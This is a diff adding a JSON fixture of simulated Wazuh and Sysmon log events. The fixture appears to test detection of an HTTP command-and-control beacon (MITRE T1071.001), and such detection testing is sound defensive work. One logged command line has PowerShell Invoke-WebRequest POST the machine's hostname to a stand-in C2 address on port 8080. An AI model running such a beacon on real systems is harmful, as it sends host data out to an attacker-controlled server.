@@ -1,0 +1,170 @@
+{
+  "_metadata": {
+    "attack_id": "T1071.001",
+    "variation": "001",
+    "name": "HTTP C2 Beacon",
+    "description": "PowerShell HTTP POST request simulating C2 beacon communication",
+    "expected_detection": "LOW",
+    "kill_chain_phase": "command-and-control",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - PowerShell executing Invoke-WebRequest",
+      "sequence": 1,
+      "timestamp": "2026-02-10T16:00:00.000Z",
+      "log": {
+        "timestamp": "2026-02-10T16:00:00.000+0000",
+        "rule": {
+          "level": 3,
+          "description": "Sysmon - Event 1: Process Creation",
+          "id": "100603",
+          "mitre": {
+            "id": [
+              "T1071.001"
+            ],
+            "tactic": [
+              "Command and Control"
+            ],
+            "technique": [
+              "Web Protocols"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707581600.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-10 16:00:00.000",
+              "processGuid": "{8df8f34e-2710-65c7-0001-000000000400}",
+              "processId": "4532",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -Command \"Invoke-WebRequest -Uri 'http://198.51.100.110:8080/beacon' -Method POST -Body 'hostname=WS01'\"",
+              "currentDirectory": "C:\\Users\\admin2\\",
+              "user": "CORP\\admin2",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=A8FDBA9DF15E41B6F5C69C79F66A26A9D48E174F9F1D8F7E6A5B4C3D2E1F0A9B",
+              "parentProcessGuid": "{8df8f34e-2710-65c7-0000-000000000400}",
+              "parentProcessId": "3344",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "fomorian_batch": 8,
+        "fomorian_campaign": 27,
+        "fomorian_technique": "T1071.001",
+        "fomorian_technique_name": "Web Protocols - HTTP C2 Beacon"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 3 - Network connection to C2 server",
+      "sequence": 2,
+      "timestamp": "2026-02-10T16:00:01.000Z",
+      "log": {
+        "timestamp": "2026-02-10T16:00:01.000+0000",
+        "rule": {
+          "level": 3,
+          "description": "Sysmon - Event 3: Network Connection",
+          "id": "100604",
+          "mitre": {
+            "id": [
+              "T1071.001"
+            ],
+            "tactic": [
+              "Command and Control"
+            ],
+            "technique": [
+              "Web Protocols"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event3",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707581601.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "3",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "3",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-10 16:00:01.000",
+              "processGuid": "{8df8f34e-2710-65c7-0001-000000000400}",
+              "processId": "4532",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "user": "CORP\\admin2",
+              "protocol": "tcp",
+              "initiated": "true",
+              "sourceIsIpv6": "false",
+              "sourceIp": "198.51.100.20",
+              "sourceHostname": "WS01.corp.local",
+              "sourcePort": "54321",
+              "destinationIsIpv6": "false",
+              "destinationIp": "198.51.100.110",
+              "destinationHostname": "-",
+              "destinationPort": "8080"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "fomorian_batch": 8,
+        "fomorian_campaign": 27,
+        "fomorian_technique": "T1071.001",
+        "fomorian_technique_name": "Web Protocols - HTTP C2 Beacon"
+      }
+    }
+  ]
+}
